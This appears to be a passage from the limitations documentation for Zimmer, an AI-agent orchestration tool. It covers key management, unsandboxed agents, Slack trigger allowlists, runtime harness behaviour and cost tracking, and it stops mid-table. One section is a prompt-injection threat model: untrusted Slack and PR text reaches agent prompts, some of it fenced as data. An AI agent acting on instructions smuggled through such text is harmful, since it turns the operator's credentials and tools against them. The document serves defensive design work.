- **The agents share one key, and can reach all of `API_KEYS`.** Every session's Zimmer MCP servers
  carry the deployment's self-session key, the first `API_KEYS` entry, so the log can say "the
  fleet's key did this" and not which session did it. Revoking that key disconnects every session
  from Zimmer at once, and replacing it for good means changing the deploy secret it comes from.
  `CliSpawnEnv` does not clear `API_KEYS` either, so every session's environment holds every entry:
  revoking one does not fence it off from agents, and may break a session-side script that reads
  it. Only a minted key is out of an agent's reach.
- **Revoking is not rotating.** A revoked `API_KEYS` entry stays in the variable until a deploy
  removes it, and nothing issues its replacement. A minted key has no expiry.
- **The logs are the audit trail, and INFO is not shipped.** A successful request's line goes to the
  container's stdout. Only the WARN lines ship to obs: a revoked or retired key being tried, and a
  key being minted, revoked or restored.
- **Rolling code back past #46 undoes revocation.** The previous code reads `API_KEYS` alone: every
  revoked entry authenticates again and every minted key stops working. Keep that in mind before
  moving anything that matters onto a minted key.
- **An `API_KEYS` entry is stored as an unsalted SHA-256.** A minted key has 256 random bits, so its
  digest gives nothing away. An `API_KEYS` entry is only as strong as whoever chose it: a short one
  can be brute-forced from a database dump.

### Agents run unsandboxed on the app host

Agents run as the app user, on the app host, with the app's git and `gh` credentials, spawned with
`--dangerously-skip-permissions` / `--dangerously-bypass-approvals-and-sandbox`. There is no sandbox,
and nothing in the product offers one.

Zimmer used to *say* otherwise. `Session::EXECUTION_PROVIDERS` accepted `remote_sandbox`, the MCP
`start_session` tool listed it in its enum and described it as "runs in isolated sandbox," and the
REST API docs repeated the pair. The provider behind the name
(`lib/execution/providers/remote_sandbox.rb`) was a stub: every method returned
`Result.failure("not yet implemented")`. An agent reading the tool schema could reasonably have
picked it. [#49](https://github.com/tadasant/zimmer/issues/49) removed the advertisement, leaving
`local_filesystem` as the only accepted value.

[#172](https://github.com/tadasant/zimmer/issues/172) finished the job by deleting the thing being
advertised. `lib/execution/` — a Strategy-pattern execution layer with a `SessionExecutor`, a
`Context`, a `Result`, a `CommandBuilder` and two providers behind an abstract base — was a parallel
implementation of the spawn path that nothing under `app/` ever called, and had drifted from the
live path it mirrored (it archived a finished session; a live session that finishes a turn parks in
`needs_input`). The layer is gone, and with it the `execution_provider` field: not a permitted
create param, not in `session_json`, not in the MCP `start_session` schema, not on the Administrate
panel. The column itself comes out in a follow-up deploy, per the two-phase drop rule.

None of that adds a sandbox, and nothing in the product offers one. Building one is a real project —
a new runner, new images, credential brokering, cloud provisioning — and it is not in flight. If it
is ever built, the seam it grows from is `RuntimeRegistry` and `ProcessLifecycleManager`, which is
where sessions actually start, rather than an abstraction kept warm beside them.

### Anyone in the workspace can trigger an agent via bot-mention, by default

The hardcoded allowlist is gone ([#52](https://github.com/tadasant/zimmer/issues/52) — it held two
Slack user IDs from a *different* workspace, so a fresh install ignored everyone, including its
owner). The default is now open: with `SLACK_BOT_MENTION_ALLOWED_USER_IDS` unset, any workspace
member who @mentions the bot in a channel it's in, or DMs it, can spawn an agent session.

That is deliberate — an unconfigured Zimmer should answer its owner — and it is bounded by the bot
only seeing channels it has been invited to. But it is a real grant, and it composes badly with the
next item (untrusted Slack text reaching the prompt). Set the allowlist
(`SLACK_BOT_MENTION_ALLOWED_USER_IDS`, comma-separated user IDs, in `mcp_secrets` or ENV) on any
workspace bigger than your circle of trust; a per-condition `allowed_user_ids` overrides it.

The same allowlist governs `dm_message` and the passive-listening types, where the open default is a
**wider** grant. Under `bot_mention` the practical bound is "somebody had to type `<@bot>`". Under
`passive_listen_thread` it is only "Zimmer has spoken in this thread", and under
`passive_listen_channel` only "Zimmer posted in this channel in the last 6 hours". Under
`dm_message` it is only "somebody opened a DM with the bot" — and on the DM path the allowlist is
enforced by *enumeration* (Zimmer polls only the allowed users' conversations) with no second check
behind it, so an unset allowlist means every workspace member's DM spawns a session. Nothing in the
Triggers form renders `allowed_user_ids`, so a condition created there always falls through to the
env var. Set the allowlist before enabling an all-channel passive condition, or a `dm_message` one,
on a workspace wider than your circle of trust.

### Triggers make the agent a trusted courier for untrusted input

[Issue #18](https://github.com/tadasant/zimmer/issues/18): there is nothing between "Slack event
arrived" and "agent running" except interpolation into a `prompt_template`. Untrusted Slack text
goes into the prompt, and the agent then acts with every tool its session carries, on whatever it
concludes from that text. There is no input validation, and nothing binds the agent to the
conversation it was fired for.

On a trigger's firing path, four things are mitigated
([Prompt template variables](/sessions/triggers/#prompt-template-variables)):

- **A value cannot rewrite the template.** Interpolation is a single pass, so a message that quotes
  `{{channel}}` or a title that quotes `{{labels}}` comes through as written instead of being
  expanded. Backslash sequences in a value stay literal instead of pasting template text into it.
- **A template can hand the agent Slack IDs it can trust.** When a Slack condition fires,
  `{{channel_id}}`, `{{message_ts}}`, `{{thread_ts}}` and `{{author_id}}` come from Slack's own
  fields, so the agent can be told where to reply without reading it out of the message. They render
  empty unless they have Slack's ID shape. A manual fire supplies its own, and the shape check keeps
  out prose, not a well-formed ID for the wrong channel.
- **A template can fence untrusted text off.** `{{text|untrusted}}` renders the value between
  markers that carry a code drawn at random on every fire, with a note that it is data, not
  instructions. The text cannot close the fence early.
- **Event text Zimmer appends outside the template is fenced too.** That covers the GitHub poller's
  context block (title, labels, body), the Slack poller's coalescing note, and the note the webhook
  queues into a running session. Each is fenced unless the template writes the matching placeholder
  bare. So the text of the event a trigger fired on reaches that trigger's prompt or fold note
  unfenced only where the template chose raw text, apart from the channel name in the Slack note's
  first sentence.

What remains open:

- **The agent can still do what the message says.** Fencing marks the text but does not neutralize
  it. A well-formed hostile message can still argue a model into acting, and a trusted ID in the
  prompt is advice the agent can ignore. Nothing binds the IDs into the session's tools, so a
  session fired for one thread can still post to another. That binding is the
  [workflow](/sessions/workflows/) contract's job — a validated input, and trusted identifiers
  recorded where the model cannot rewrite them — and nothing fires a workflow in production yet.
- **Both hardening features are opt-in.** An existing template gets the single pass, but its
  `{{text}}` stays unfenced and it names no Slack ID until someone edits it. The fencing of text
  Zimmer appends is not opt-in: it follows the template, so a template that never names `{{text}}`
  gets the Slack coalescing notes fenced, and one that writes `{{text}}` bare gets them raw. Fencing by default was considered and not done: a DM trigger whose
  message is the request would silently start calling that request data, and nothing can tell that
  trigger apart from one whose message is only evidence
  ([Event text Zimmer appends](/sessions/triggers/#event-text-zimmer-appends)).
- **Who can reach the agent is decided before any of this.** The only gate on who may fire a
  `bot_mention`, `dm_message` or passive-listening trigger is the
  [Slack allowlist](/sessions/triggers/#who-may-trigger-a-bot_mention-a-dm_message-or-a-passive-listener),
  and it defaults to the whole workspace.

Tracked in [#50](https://github.com/tadasant/zimmer/issues/50), with the mechanism in
[#18](https://github.com/tadasant/zimmer/issues/18).

### Quoted PR comment context is allowlisted; the diff hunk is not

The [PR comment poller](/operate/background-jobs/#the-allowlist-covers-quoted-context-too-not-just-the-trigger)
withholds the *body* of any quoted comment whose author is outside `GithubCommentAllowlist`, because
a body is prose a stranger typed. Two things it does not cover:

An outside contributor's legitimate thread context goes into the same bin. A session woken by a
comment on a PR that a non-allowlisted person also commented on sees who spoke and not what they
said, and is told not to fetch it. That is the accepted cost of the gate, and the only way back is
to add the account to the allowlist — the same decision as letting them wake sessions.

The `diff_hunk` on an inline review comment is still interpolated into the prompt verbatim. GitHub
builds it from the PR's own branch rather than from anything the commenter typed, so the text is
code Zimmer's own agent usually wrote — but it is untrusted-adjacent on a PR from a fork, and
nothing labels it.

### A message queued by anyone coalesces a recurring trigger's next fire

[Coalescing](/sessions/triggers/#coalescing-a-repeated-fire) asks whether the reused session has
**any** pending message, not whether it has one this trigger queued. So a message a human (or another
session) queues onto a reused session also folds away that trigger's next scheduled fire.

Per-trigger provenance would not fix it. The rows that caused the 2026-08-29 incident were written by
`SpotSessionHold#queue_behind_scheduled_turn`, which holds a session and a prompt and has no idea
which trigger sent it — a `trigger_id` column on `enqueued_messages` would have matched none of them,
and the accumulation would have continued. The broad predicate is the one that actually catches the
bug, and it is the same one the `running?` branch has always used.

The cost is normally bounded at one occurrence: the session consumes its queue, and the next fire
lands. It is also no longer silent — the fold increments `missed_fire_count`. But "normally" is doing
real work in that sentence; see the next entry.

### A `waiting` session's queue has no sweep, so coalescing can wait on a turn that never comes

[Coalescing](/sessions/triggers/#coalescing-a-repeated-fire) skips the fire, and skipping the fire also
skips the **resume**. `Session#deliver_follow_up!` does two things to an idle session — it delivers the
prompt *and* it transitions the session to `running`, which is what eventually drains the queue. A
coalesced fire does neither.

For the case this was built for that is fine: a spot session held at the quota gate always has a
re-check job scheduled, so it takes a turn on its own. It is not fine in general, because **nothing
sweeps a `waiting` session's pending queue.** `EnqueuedMessage#deliver_if_session_already_idle` only
schedules a drain for a `needs_input` session; `HeartbeatSweepJob` does nothing for `waiting` and
explicitly skips a session that has pending messages. So a `waiting` reuse target holding a message
queued through the web form, the REST endpoint or MCP — none of which checks session state — can sit
there, with the trigger coalescing every fire against it.

Before this change the trigger's own fire resumed the session and incidentally un-stuck it. That was
accidental rather than designed, and it is the same resume that filed a duplicate prompt every time,
which is the bug being fixed. The honest position is that coalescing stopped masking a pre-existing
gap: the queue drain, not the trigger, is what should wake a `waiting` session. Tracked in
[zimmer#690](https://github.com/tadasant/zimmer/issues/690).

The mitigation is that it is loud rather than silent — `missed_fire_count` climbs and the alert fires
on the second miss, and the alert text tells the operator to check that something will actually make
the session take a turn.

### A coalesced fire runs the earlier prompt, so `{{date}}` in a reused template goes stale

When a recurring trigger's fire is [coalesced](/sessions/triggers/#coalescing-a-repeated-fire) into a
prompt the reused session is still holding, the prompt that eventually runs is the **first** one
queued, not the latest. For a template that interpolates `{{date}}` or `{{time}}`, the run therefore
carries the date of the night it was first queued rather than the night it actually executes.

Coalescing by refreshing the queued row's content instead would keep the interpolation current, but
Zimmer cannot tell which pending row belongs to which trigger — `enqueued_messages` records no
provenance beyond `origin`, and rewriting an arbitrary pending row would corrupt a message a human or
another session queued. Skipping is the safe direction to be wrong in: the work runs once with a
stale timestamp rather than twice, or not at all.

The mitigation is that the miss is no longer silent — `missed_fire_count` says how many occurrences
were folded together, so a stale date in a groomer's output has a visible explanation.

### A trigger cannot spawn a session with zero MCP servers

The three surfaces that create a session against a root directly — MCP `start_session`, `POST
/api/v1/sessions`, and the new-session form — distinguish an omitted `mcp_servers` (take the root's
defaults) from an explicit `[]` (take none). `Session.create_from_agent_root!` does not: `nil` and
`[]` both inherit the root's defaults there.

That is deliberate, not an oversight. `create_from_agent_root!` is what the dashboard quick prompt,
the chat bubble, and every [trigger](/sessions/triggers/) spawn through, and a `Trigger`'s
`mcp_servers` column is `default: [], null: false` — so `[]` is what an untouched trigger stores, not
a request for none. Reading it as "no servers" would silently strip the servers from every existing
trigger at once.

The consequence is that a trigger whose root carries privileged defaults always spawns with them.
There is no way to configure a least-privilege trigger short of giving its root narrower defaults, or
having the spawned session clear its own list with `change_mcp_servers` after it starts — which is
after the servers have already been wired for that run.

---

## Agent harness

### An AIR hook body on Pi has one line of defence: the `@tadasant/pi-hooks` version floor

🟡 AIR is vendor-neutral and a `HOOK.json` really is portable, but AIR specifies no schema
for what a hook body reads on stdin or writes back. In practice a portable body is written
against whatever AIR's reference adapter registers it with — Claude Code:

| | stdin payload | how context reaches the model |
| --- | --- | --- |
| Claude Code (`PostToolUse`) | `{tool_name, tool_input, tool_response}` | `hookSpecificOutput.additionalContext` |
| Pi-native (`@tadasant/pi-hooks`) | `{event, toolName, input, content}` | `{"content": …}`, which **replaces** the tool result |

**Below `@tadasant/pi-hooks@0.2.0` only the second column existed**, so a body written for the
first read `undefined` from every field and had everything it wrote discarded — while loading,
matching, spawning and exiting 0. `[pi-hooks] loaded 1 hook(s)` was printed either way, which
is what made it invisible.

From 0.2.0 the extension sends **both** namings on every event and honors **both** replies, so
either body works unmodified. Zimmer therefore pins 0.2.0 as a floor rather than a
current-version, and `PiExtensions::REGISTRY` says so; the floor is held by a live test
(`test/integration/pi_hooks_and_plugins_live_test.rb`) that drives a real `pi` with a hook body
speaking only Claude's dialect, and which fails against 0.1.0. Run it by hand with `PI_E2E=1` —
CI has no `pi` binary and skips it, so the floor is documented and reproducible rather than gated.

Two differences survive the fix and are worth knowing when writing a body:

- **`content` replaces; `additionalContext` appends.** A Pi-dialect body that returns only its
  own text silently discards the command's real output — which is why the catalog's
  `git-push-ci-reminder` echoes the original back ahead of its reminder. A Claude-dialect body
  needs no such care.
- **A body can still tell where it is.** `@tadasant/pi-hooks` sets `PI_HOOK=1` on every hook
  process. `git-push-ci-reminder` branches on it and answers in the matching dialect; a body
  adopted from elsewhere does not have to.

### What actually works on the Pi runtime — the harness matrix

Pi is Zimmer's third runtime and the only one that arrives with **no MCP, hooks or plugins of
its own**; all three are supplied by pinned Pi extensions (see
[the agent harness](/extend/agent-harness/)). That makes "which harness features work on Pi"
a question with a per-feature answer rather than a yes or no, and the answers below are
**measured on live sessions**, not read off the code.

Two rows read differently from the rest and are worth knowing before the table. Pi connects an
MCP server **lazily** — at spawn every server reports "not listening; disconnected", and that
is the healthy resting state, not a fault. And the adapter routes tool calls through proxy
tools (`mcp__<server>`, or the bare `mcp`), so a Pi transcript names MCP tools differently from
a Claude Code one.

Lazy connect changes what `pending` means on a Pi session, and it is worth reading correctly.
Every runtime resets `mcp_servers_status` to `pending` at the start of a turn, because a
`connected` from the process that just exited says nothing about the one starting. Claude Code
then re-greens a server as it starts up, whether or not the agent uses it; **Pi cannot, because
it does not connect a server until something calls it.** So a Pi turn that needs no MCP leaves
every server `pending` for that turn, correctly: nothing connected, because nothing asked.
`pending` on Pi means "not connected yet", not "broken" and not "unknown".

| Feature | Pi | Evidence |
| --- | --- | --- |
| MCP — no-auth stdio | ✅ works | 6 tools listed, `browser_get_state` returned state (`playwright-custom`) |
| MCP — `${VAR}` secret-injected stdio | ✅ works | 16 tools listed, `airtable_list_bases` returned 69 bases |
| MCP — strad-proxied HTTP (bearer header) | ✅ works | `strad-fetch` scraped a page; `remote-fs-screenshots` listed 42 directories |
| MCP — Zimmer's auto-injected `zimmer-self-session` | ✅ works | 7 tools listed, `get_session` returned the session |
| MCP — OAuth-credentialed | ✅ works | Token verified on the wire as `Authorization: Bearer`. Adopting back a token Pi refreshed is implemented and demonstrated end-to-end against a real OS credential store, driving the adapter's own keyring helper — not yet observed on a live Pi session, because it needs a provider to rotate. What does not work is pushing a refreshed token into an *already-running* session (below) |
| Per-server MCP status (`mcp_servers_status`) | ✅ works, green-or-grey | `PiMcpStatusDetector` mines the transcript; was permanently `pending` before it. Never reports red (below) |
| Skills | ✅ works | `air prepare pi` installs them into `.pi/skills/` — the one artifact `adapter-pi` handles natively |
| AIR hooks | ✅ works | Live `pi 0.84.4` + `@tadasant/pi-hooks@0.2.0`: the reminder hook rewrote a `bash` tool result the model then read, and so did a hook speaking only Claude Code's dialect (below) |
| AIR plugins | ✅ works | `screenshots-videos` activated; its two bundled MCP servers reached the session |
| Token-usage / cost ingestion | ⚠️ tokens work, cost works on the Anthropic models | `PiTokenUsageIngestionService` reads `sessions.transcript`; 12 calls / $0.582929 across the three sessions above, matching Pi's own figure exactly. Pi's OpenAI and Google models are unpriced (below) |
| Status summary by forking the session | ❌ does not work | `PiAuthProvider` pools no accounts (below) |
| Retrying a failed model call | ❌ does not work | Pi reports the failure but exposes no retry (below) |

### AIR hooks on Pi: what the earlier "they never fire" verdict actually was

🟢 Resolved, and recorded because the way it was wrong is reusable. An earlier QA pass
concluded that a selected AIR hook loads on Pi and is never dispatched. It is not so: the
catalog's `git-push-ci-reminder` fires on Pi, rewrites the tool result, and did so on the
version that pass was run against.

The probe was `echo "git push origin main"`, and it came back verbatim. The hook fired; its own
pattern declined the quote — `git` preceded by `"` did not sit on a separator the matcher
recognised, so the body returned early and wrote nothing, which is byte-for-byte what a hook
that is never dispatched looks like from outside. The matcher now treats a quote as a boundary
like any other, and the live test drives that exact probe so the verdict is not reachable again.

Two lessons, both cheap:

- **A hook that writes nothing and a hook that never ran are the same observation.** Distinguish
  them by making the hook write unconditionally, not by re-running the same negative probe.
- **`[pi-hooks] loaded N hook(s)` proves loading and nothing else.** It was printed throughout,
  and it was printed throughout the genuine
  [dialect no-op above](#an-air-hook-body-on-pi-has-one-line-of-defence-the-tadasantpi-hooks-version-floor)
  too.

### A Pi session's MCP status pills go green or stay grey — never red

🟡 `PiMcpStatusDetector` reports `connected` and nothing else. A Pi server that is not green is
grey, and grey covers three different things: nobody called it, it was called and refused, or
it was called and the provider rejected the credential.

That is deliberate rather than unfinished, for two reasons that compound. Pi connects lazily, so
"not connected" is the normal resting state and a red pill for it would be wrong on most
sessions. And the adapter's refusal text does not say what it appears to: `Server "x" requires
OAuth authentication` is its message for **any `401` during connect** —
`isUnauthorizedHttpError` routes both cases to the same `getAuthRequiredMessage` — so it reads
like "Zimmer never gave me a token" and equally means "the token I was given was rejected",
including one that merely expired mid-turn. `McpStatusPersisting` escalates a *configured*
server's `failed` to a session-level failure, one-shot and irreversible, so reporting that
message as `failed` would have invented a new way to kill a Pi session on a signal that cannot
tell a misconfiguration from a bad minute at the provider.

The distinction between the two OAuth cases is visible elsewhere, and worth knowing before
debugging one: Zimmer logs
`Wrote N Pi MCP OAuth credential(s) for import` when it stages a credential, and the adapter
deletes the staged file once it imports it, so an empty `<pi agent dir>/mcp-oauth/` after a spawn
means the handover happened.

### A refreshed MCP OAuth token does not reach a session that is already running

🟡 Zimmer is not the only party that refreshes these tokens, and it cannot become
the only one. **Claude Code and Pi both ship their own MCP OAuth client**, and both refresh an
access token that lapses mid-session — Claude Code writes the new pair to
`~/.claude/.credentials.json`, Pi's `pi-mcp-adapter` hands the MCP SDK a provider whose
`saveTokens` writes it into the OS credential store. Against a provider that rotates refresh
tokens, either one leaves Zimmer's DB holding a token the provider has revoked.

The obvious-sounding fix — turn the runtime's refresh off and make Zimmer the sole
authority — **has no switch to throw.** `pi-mcp-adapter`'s only relevant configuration is
`oauth: false`, which disables OAuth for the server outright rather than pinning the token
Zimmer staged, and no environment variable narrows it (`supportsOAuth` in `mcp-auth-flow.ts`).
Claude Code exposes nothing either. So Zimmer **adopts back** instead:
[`McpOauthRuntimeReconciler`](/auth/mcp-oauth/#capturing-the-token-the-runtime-rotates-write-back)
reads each runtime's store before Zimmer refreshes or injects, and takes a strictly newer pair
into the DB. That is a real ordering, not a coin-flip between two writers: only a *later
access-token expiry* is adopted, so the chain advances in one direction and a re-stamp of an
older pair can never win. Codex is the one runtime with no problem to solve — it does not
refresh MCP tokens itself, so its store never holds anything newer.

What remains is the **push**, and it is the half that is not achievable today rather than the
half nobody wrote:

- **A running session would not see it.** `pi-mcp-adapter` memoizes each server's auth entry in
  a process-local `authEntryCache`, and only drops it when its own provider rejects an access
  token. Writing a fresh token into the credential store under a live Pi process therefore
  changes nothing until that process next hits a 401 — at which point it re-reads and picks the
  new token up anyway. Shipping a push would look like it worked and mostly would not, which is
  the precise failure shape this area keeps producing. (There is an undocumented
  `PI_MCP_ADAPTER_DISABLE_AUTH_CACHE=1` that turns the memo off; relying on a private test knob
  to make a feature correct is a worse trade than not having the feature.)
- **Adoption is therefore periodic, not instantaneous.** A rotation is captured at the next
  moment Zimmer looks: every spawn (`McpOauthCredentialInjector`) and every 30 minutes
  (`RefreshMcpOauthTokensJob`, which reads *every* runtime's store because it has no session and
  so no runtime). That is early enough that nothing goes stale, because the cron never presents a
  rotated-away token — it is not early enough to call it a push.
- **Pi's store is probed, not listed.** After import the entries live in the OS credential store,
  addressed by `sha256(server_name)` with no enumeration, so
  `PiMcpCredentialWriter#read_runtime_credentials` answers only for keys it is handed and `{}` for
  a bare "list everything". Every caller wants a named credential, so this costs nothing — but a
  future caller that genuinely wants an inventory of Pi's store cannot have one.
- **A credential store that will not answer degrades to "nothing to adopt".** The read runs
  `node mcp-keyring-helper.cjs` with a 5-second budget; an image without the extension, or a store
  that hangs, is logged and skipped rather than failing the spawn or the cron. In that window
  Zimmer keeps using its own copy, which is the pre-existing behavior, not a regression.

A second, smaller edge falls out of the import path. The adapter reads the credential
store **before** the plaintext file and deletes the file unread when it finds an entry there, so
a stale store entry would shadow a freshly written token. `#write!` clears the entry first,
through the adapter's own keyring helper. If that helper cannot run, the clear is skipped with a
warning and the spawn continues, and in that window the runtime may keep using the older token.

### A Pi session on a non-Anthropic model records its tokens and no cost

🟡 Pi spend **is** in the ledger. `PiTokenUsageIngestionService`
([costs](/operate/costs/#pis-token-usage)) reads the durable copy of the transcript in
`sessions.transcript` rather than a file, which is what Pi being the one runtime whose
conversation lives in the clone — and is reaped with it — forces. Volumes, model, agent root
and timestamps all land, and for the Anthropic models on OpenRouter the money lands too: the
list rates `TokenPricing` already carries *are* the rates OpenRouter publishes for them, so
Zimmer's figure reproduces the cost Pi recorded beside the volumes to the cent.

What does not work is the other half of Pi's model catalog. `openrouter/openai/gpt-5.4`,
`…/gpt-5.4-mini` and `openrouter/google/gemini-3.5-flash` have no rate in `TokenPricing`, so a
Pi session on one of them lands with correct tokens and **zero cost**, and appears in the
Costs page's unpriced-models list. `TokenPricing` derives a model's three cache rates from its
input rate by a multiplier relationship that is uniform across Anthropic's line and simply
false elsewhere — OpenAI charges nothing for a cache write, Gemini charges a storage rate — so
pricing them means teaching `Rate` to carry explicit cache rates rather than adding two
numbers. The deployment's default Pi model is `openrouter/anthropic/claude-opus-4.6`, so this
is the tail rather than the common case, and an unpriced model is *visibly* unpriced rather
than silently under-counted.

### A Codex session records its tokens and no cost at all

🟡 Codex spend **is** in the ledger — `CodexTokenUsageIngestionService`
([costs](/operate/costs/#codexs-token-usage)) reads the rollout tree under
`~/.codex/sessions/YYYY/MM/DD/`, decompressing the `.jsonl.zst` files a finished rollout becomes,
and writes one row per `token_count` event. Volumes, model, session, agent root and timestamps all
land. It closed [#1077](https://github.com/tadasant/zimmer/issues/1077), where the runtime was
absent from the ledger altogether.

What does not land is money. `TokenPricing` carries **Anthropic rates only**, so every Codex model
— `gpt-5.6-sol`, `gpt-5.6-terra`, `gpt-5.6-luna` — prices at **$0** and appears in the Costs page's
unpriced-models list. A Codex session therefore contributes tokens to every volume figure on the
page and nothing to any dollar figure. This is the same gap Pi's non-Anthropic models sit in, with
the same fix: `Rate` derives its three cache rates from the input rate by a multiplier relationship
that is uniform across Anthropic's line and false for OpenAI, which charges nothing for a cache
write, so pricing these means teaching `Rate` to carry explicit cache rates rather than adding two
numbers per model. Until it does, an unpriced model is *visibly* unpriced rather than silently
under-counted — which is the point of surfacing the list at all.

Two smaller edges of the same ingestion path, both counted rather than silent:

- A `token_count` event that arrives before any `turn_context` or `thread_settings_applied` has
  named a model is **skipped**, and shows in the run's `skipped` figure. `model` is `NOT NULL` and
  guessing one would put a wrong rate on real volume. Codex emits a `turn_context` at the head of
  every turn, so this has not been observed.
- Codex reports no server-tool request counters on the token event, so a `web_search` shows up as
  its own rollout event with no billing figure attached and the row's `web_search_requests` stays
  zero. On a runtime whose models are unpriced anyway, that costs nothing today.

### A Pi session's status summary always takes the cheap path

🟡 `SessionStatusSummaryGenerator#pool_exhausted?` asks the runtime's auth provider whether
its account pool has anything left, and falls back to a one-shot headless generation when it
does not. `PiAuthProvider` pools no accounts at all — Pi resolves a provider API key from the
session environment per request — so that question is always answered "exhausted" and a Pi
session's status summary is never generated by forking the session.

The outcome is right for the wrong reason. A fork would run on Pi and would need the same
provider key the (nonexistent) pool cannot vouch for, so the cheap path is the correct one
here. But it is reached by a predicate that means "the pool is empty" being asked of a
runtime that has no pool, rather than by anything that knows Pi does not pool credentials.

### Pi retries a transient provider failure and parks a quota wall; auth and context length are terminal

🟡 A Pi session now gets the API-error backoff a Claude session gets, and a quota wall parks
rather than fails, and it does not get compaction recovery or auth recovery — because for Pi
those two have nothing to recover *into*, not because nothing detects them.

Pi records a failed model call as an assistant message with `stopReason: "error"` and an
`errorMessage` carrying the provider's own words, and **the process exits 0 either way**.
`PiTurnError` classifies that record and `PiTranscriptSource#records_turn_errors?` is `true`, so
`ApiErrorRetryService` reaches it through the same `RecordedTurnError` seam Codex uses. What each
failure gets, characterized against the real `pi 0.84.4` binary driven by a local provider stub:

| Backend said | Pi recorded | Zimmer does |
| --- | --- | --- |
| 500 / 502 / 503 | `500: {…}`, `502 <html>…`, `503: {…}` | backoff retry, up to 6 |
| 429 rate limit | `429: {…}` | backoff retry, up to 6 |
| 402 insufficient credits, or a 429 worded as a quota wall (`insufficient_quota`, "quota exceeded", …) | `402: {…}` / `429: {…}` | park on a timed re-check — no budget spent, no page |
| 408 timeout | `408: {…}` | backoff retry, up to 6 |
| stream closed mid-response | `terminated` | backoff retry, up to 6 |
| connection refused, non-HTTP reply, early socket close | `Connection error.` | backoff retry, up to 6 |
| 401 / 403 | `401: {…}` / `403: {…}` | fail, naming the provider — no page |
| any other 4xx, context-window refusals among them | `400: {…}` | fail, naming the provider — no page |
| no HTTP status, and no transport wording Zimmer knows | whatever Pi wrote | fail, **and page** |

**The status decides, not the error body — and that is a deliberate consequence of which
provider Pi actually talks to.** The characterization above drove an OpenAI-dialect stub, but
every Pi model `ModelCatalog` offers is an `openrouter/*` id, and OpenRouter words its bodies
differently: its context-window refusal carries a numeric `"code":400` rather than
`"code":"context_length_exceeded"`, and it uses 402 for an exhausted balance. A classifier keyed
on one provider's strings would misroute the provider Zimmer ships — and, because
`classifies_exits?` is now `true`, would turn every unmemorized shape into a page. So `PiTurnError`
classifies on the HTTP status, which is Pi's own framing and provider-independent, and consults the
body for exactly one refinement: naming a 400 as a context-window refusal when it happens to say
so. A 4xx Zimmer cannot name more precisely still fails quietly, because Zimmer *read a status* —
it understands the shape well enough that failing is not an unknown failure mode, even when the
sub-reason is out of reach.

The cost of that choice, stated plainly: a genuine bad-request bug (a 400 Pi should never have
sent) fails the session quietly instead of paging. The thing that still pages is a turn error with
no readable status and no transport wording Zimmer knows — a genuinely novel shape, which is what
the alert is for.

**Context length is terminal because Pi has no compaction to trigger.** It has no `/compact`
command, and — unlike Codex — it does not compact on a plain resume either
(`RuntimeCliAdapter.compacts_on_resume?` is `false` for Pi). Resuming a session that died on a
context-length 400 wrote no `{"type":"compaction"}` record and re-sent the same conversation with
one more user message appended, failing identically: routing it to a retry would spend the budget
making the prompt longer. `PiTurnError` gives it the kind `:context_length_terminal`, which no
recovery service looks for.

**Auth is terminal because there is no pool.** `PiAuthProvider` pools no accounts by design — Pi
resolves a provider API key from the session environment per request — so `AuthRecoveryService` has
no credential to rewrite and nothing to rotate to. A 401 is a fact about the key the session was
handed, so it fails naming the provider's own wording rather than parking a human in front of a
pool that does not exist. That cell of [#856](https://github.com/tadasant/zimmer/issues/856) is
closed as "terminal by design", not implemented.

**A quota wall parks on a timer, because there is no pool to wake on.** A Claude or Codex quota
wall rotates, or parks until `QuotaResetCheckerJob` sees an account in the pool come back. Pi has
no pool and no quota snapshot, so `ProviderQuotaWallPark` parks the session on a timed re-check
instead: it arms a one-time wake (the same trigger `wake_me_up_later` creates) at 15 minutes, then
30, 1 h, 2 h, 4 h, and every 8 h after that, and each wake resumes the session so the provider can
answer again. A turn that completes ends the streak. No API-error retry budget is spent, nothing
fails, and nothing pages; the first park of a streak sends one push notification. What this costs:

- **A 429 is a quota wall only by Pi's own wording list.** Status cannot tell
  `insufficient_quota` from `rate_limit_exceeded`, so `PiTurnError::PROVIDER_LIMIT_WORDING` is
  pi-ai's `NON_RETRYABLE_PROVIDER_LIMIT_ERROR_PATTERN` copied verbatim — the list Pi itself consults
  before it retries, and the reason a quota 429 reaches Zimmer after one request while a rate limit
  reaches it after four. A quota wall worded in a way neither list knows takes the ordinary backoff
  and fails. The misread in the other direction is bounded: a rate limit whose prose happens to
  match — most plausibly Gemini's per-minute `RESOURCE_EXHAUSTED`, which says "check your plan and
  billing details" — parks for 15 minutes and sends a quota-wall push instead of backing off, the
  same reading Pi gives it. A Pi upgrade can change the list;
  `PiTurnErrorTest` compares the two whenever pi-ai is installed where the test runs, which CI's
  runner is not.
- **Seven days, then a human.** Re-checks stop once the next one would land more than seven days
  after the streak's first park. The session is left in `needs_input` saying so, with a second
  push. A prepaid balance does not refill on a clock, and a wall that has stood for a week is one
  nobody is topping up. Resuming the session starts a fresh ladder.
- **Re-checks do not know when the balance comes back.** Nothing reports a top-up, so a session
  parked on its 8-hour rung can wait up to 8 hours after the balance is restored. Send it a message
  to resume it sooner; a turn that completes withdraws the pending re-check. A message *queued*
  while the session is parked is held until the re-check is due, for the same reason an auth-outage
  park holds one: it would meet the same wall.
- **A streak is continued only by its own re-check.** A wall that arrives more than 8 hours after
  the streak's re-check was due starts a fresh streak at 15 minutes, so a session that ran on since
  never inherits an old streak's rung or ceiling.
- **A re-check can retire the session's own wakes.** The re-check is a one-time wake, so it follows
  held-wake-group rules: if the agent had armed its own wake before the wall and the re-check fires
  first and meets the wall again, the agent's wake is retired when that turn comes to rest. A
  session that failed on the wall lost that wake too, so this is not a new loss, but the agent is
  not told.
- **One trigger per parked session.** Each park adds a wake trigger row, so a balance that runs out
  under many Pi sessions shows that many rows on `/triggers` until the wall clears.

`classifies_exits?` is now `true` for Pi, so an exit no classifier claims pages instead of only
logging. That is the point of the classification: the ordinary Pi failures are accounted for, so
what is left is genuinely news.

`failed_resume_recovery_needed?` is a different case and is *correctly* `false`: Pi's
`--session-id` creates a missing session rather than exiting non-zero, so the Codex "no
rollout found" condition cannot arise. A lost transcript is handled instead by
`PiTranscriptSource#rotates_transcript_files?` being `false`, which makes a shortened read get
repaired from Zimmer's stored bytes before the resume.

### Failure classification is regex against CLI prose

🔴 Everything Zimmer knows about *why* a session died comes from string-matching English:

| What | Pattern | File |
| --- | --- | --- |
| Quota exhausted → rotate accounts, then park | `/hit your\b.*\blimit\b.*\bresets\b/i` | `api_error_retry_service.rb` |
